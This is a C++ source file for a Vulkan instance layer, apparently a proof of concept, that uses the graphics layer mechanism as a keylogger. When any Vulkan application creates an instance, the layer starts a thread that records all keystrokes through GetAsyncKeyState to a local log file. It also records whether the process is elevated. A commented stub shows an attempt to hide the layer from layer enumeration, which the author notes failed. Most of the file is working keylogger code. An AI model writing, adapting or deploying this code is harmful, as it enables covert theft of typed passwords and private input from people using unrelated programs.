#include <vulkan/vk_layer.h>
#include "vk_layer_dispatch_table.h"

#include <assert.h>
#include <string>

#include <mutex>
#include <map>

#include <fstream>

// Windows-specific include for key input detection.
#include <Windows.h>

#include <thread>
#include <limits>

#undef VK_LAYER_EXPORT
#if defined(WIN32)
#define VK_LAYER_EXPORT extern "C" __declspec(dllexport)
#else
#define VK_LAYER_EXPORT extern "C"
#endif

///////////////////////////////////////////////////////////////////////////////////////////
// Global variables and helper functions

int instance_count = 0;

// single global lock, for simplicity
std::mutex global_lock;
typedef std::lock_guard<std::mutex> scoped_lock;

// use the loader's dispatch table pointer as a key for dispatch map lookups
template<typename DispatchableType>
void *GetKey(DispatchableType inst)
{
  return *(void **)inst;
}

// layer book-keeping information, to store dispatch tables by key
std::map<void *, VkLayerInstanceDispatchTable> instance_dispatch;

// Vimal Shekar's function for checking if the current process has admin rights on Windows: https://vimalshekar.github.io/codesamples/Checking-If-Admin
BOOL IsProcessElevated()
{
  BOOL fIsElevated = FALSE;
  HANDLE hToken = NULL;
  TOKEN_ELEVATION elevation;
  DWORD dwSize;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
  {
    printf("\n Failed to get Process Token :%d.",GetLastError());
    goto Cleanup;  // if Failed, we treat as False
  }


  if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
  {	
    printf("\nFailed to get Token Information :%d.", GetLastError());
    goto Cleanup;// if Failed, we treat as False
  }

  fIsElevated = elevation.TokenIsElevated;

Cleanup:
  if (hToken)
  {
    CloseHandle(hToken);
    hToken = NULL;
  }
  return fIsElevated; 
}

// log file
std::ofstream logfile;
#define LOGFILE_NAME "sample_layer_output.log"

inline void LOG(std::string text) {
  if (!logfile.is_open()) {
    logfile.open(LOGFILE_NAME, std::fstream::app);
    if (!logfile.is_open()) // Failed to open file
      return;
  }
  logfile << text;
  logfile.close();
}

///////////////////////////////////////////////////////////////////////////////////////////
// Attempt to intercept an application's a request to list all layers on the system.
// If possible, a layer could remove itself from the list before the list is sent to the application.
// Result: Failed. A layer can not intercept calls to vkEnumerateInstanceLayerProperties

VK_LAYER_EXPORT VkResult VKAPI_CALL SampleLayer_EnumerateInstanceLayerProperties(
    uint32_t*                                   pPropertyCount,
    VkLayerProperties*                          pProperties) {
  LOG("The application is attempting retrieve a list of all instance layers!\n");
  return VK_SUCCESS;
}

///////////////////////////////////////////////////////////////////////////////////////////
// Keypress Logging callable

std::thread key_thread;
bool key_running;
std::ofstream keylogfile;
#define KEYLOGFILE_NAME "sample_layer_key_output.log"

template<typename T>
inline void KEYLOG(T text) {
  if (!keylogfile.is_open()) {
    keylogfile.open(KEYLOGFILE_NAME, std::fstream::app);
    if (!keylogfile.is_open()) // Failed to open file
      return;
  }
  keylogfile << text;
  keylogfile.close();
}

void log_keys() {
  KEYLOG("Starting logging session...\n");
  bool keys[190]; // keydown?
  for (int i = 0; i < 190; i++) keys[i] = false;
  while (key_running) {
    Sleep(10);
    for (int key = 8; key <= 190; key++) {
      if (GetAsyncKeyState(key) & 0x8000) {
        keys[key] = true;
      } else if (keys[key]) {
        switch (key) {
        case VK_SPACE:
          KEYLOG(" ");
          break;
        case VK_RETURN:
          KEYLOG("\n");
          break;
        case VK_BACK:
          KEYLOG("\b");
          break;
        case VK_SHIFT:
          KEYLOG("#SHIFT#");
          break;
        case VK_CAPITAL:
          KEYLOG("#CAPS_LCOK");
          break;
        default:
          KEYLOG(char(key));
        }
        keys[key] = false;
      }
    }
  }
  KEYLOG("\nLogging session ended.\n");
}

///////////////////////////////////////////////////////////////////////////////////////////
// Layer startup and shutdown callbacks.

void startup() {
  LOG("Sample Layer started!\n");
  LOG("Is process elevated? " + std::to_string(IsProcessElevated()) + '\n');
  key_running = true;
  key_thread = std::thread(log_keys);
}

void shutdown() {
  key_running = false;
  key_thread.join();
  LOG("Sample Layer shutting down!\n");
}

///////////////////////////////////////////////////////////////////////////////////////////
// Layer init and shutdown on Vulkan instance creation/destruction

VK_LAYER_EXPORT VkResult VKAPI_CALL SampleLayer_CreateInstance(
    const VkInstanceCreateInfo*                 pCreateInfo,
    const VkAllocationCallbacks*                pAllocator,
    VkInstance*                                 pInstance)
{
  instance_count++;
  if (instance_count == 1) {
    startup();
  }

  VkLayerInstanceCreateInfo *layerCreateInfo = (VkLayerInstanceCreateInfo *)pCreateInfo->pNext;

  // step through the chain of pNext until we get to the link info
  while(layerCreateInfo && (layerCreateInfo->sType != VK_STRUCTURE_TYPE_LOADER_INSTANCE_CREATE_INFO ||
                            layerCreateInfo->function != VK_LAYER_LINK_INFO))
  {
    layerCreateInfo = (VkLayerInstanceCreateInfo *)layerCreateInfo->pNext;
  }

  if(layerCreateInfo == NULL)
  {
    // No loader instance create info
    return VK_ERROR_INITIALIZATION_FAILED;
  }

  PFN_vkGetInstanceProcAddr gpa = layerCreateInfo->u.pLayerInfo->pfnNextGetInstanceProcAddr;
  // move chain on for next layer
  layerCreateInfo->u.pLayerInfo = layerCreateInfo->u.pLayerInfo->pNext;

  PFN_vkCreateInstance createFunc = (PFN_vkCreateInstance)gpa(VK_NULL_HANDLE, "vkCreateInstance");

  VkResult ret = createFunc(pCreateInfo, pAllocator, pInstance);

  // fetch our own dispatch table for the functions we need, into the next layer
  VkLayerInstanceDispatchTable dispatchTable;
  dispatchTable.GetInstanceProcAddr = (PFN_vkGetInstanceProcAddr)gpa(*pInstance, "vkGetInstanceProcAddr");
  dispatchTable.DestroyInstance = (PFN_vkDestroyInstance)gpa(*pInstance, "vkDestroyInstance");
  dispatchTable.EnumerateDeviceExtensionProperties = (PFN_vkEnumerateDeviceExtensionProperties)gpa(*pInstance, "vkEnumerateDeviceExtensionProperties");

  // store the table by key
  {
    scoped_lock l(global_lock);
    instance_dispatch[GetKey(*pInstance)] = dispatchTable;
  }

  return VK_SUCCESS;
}

VK_LAYER_EXPORT void VKAPI_CALL SampleLayer_DestroyInstance(VkInstance instance, const VkAllocationCallbacks* pAllocator)
{
  instance_count--;
  if (instance_count == 0) {
    shutdown();
  }
  {
    scoped_lock l(global_lock);
    instance_dispatch.erase(GetKey(instance));
  }
}

///////////////////////////////////////////////////////////////////////////////////////////
// GetProcAddr functions, entry points of the layer

#define GETPROCADDR(func) if(!strcmp(pName, "vk" #func)) return (PFN_vkVoidFunction)&SampleLayer_##func;

VK_LAYER_EXPORT PFN_vkVoidFunction VKAPI_CALL SampleLayer_GetInstanceProcAddr(VkInstance instance, const char *pName)
{
  // instance chain functions we intercept
  GETPROCADDR(GetInstanceProcAddr);
  GETPROCADDR(CreateInstance);
  GETPROCADDR(DestroyInstance);
  GETPROCADDR(EnumerateInstanceLayerProperties);

  {
    scoped_lock l(global_lock);
    return instance_dispatch[GetKey(instance)].GetInstanceProcAddr(instance, pName);
  }
}

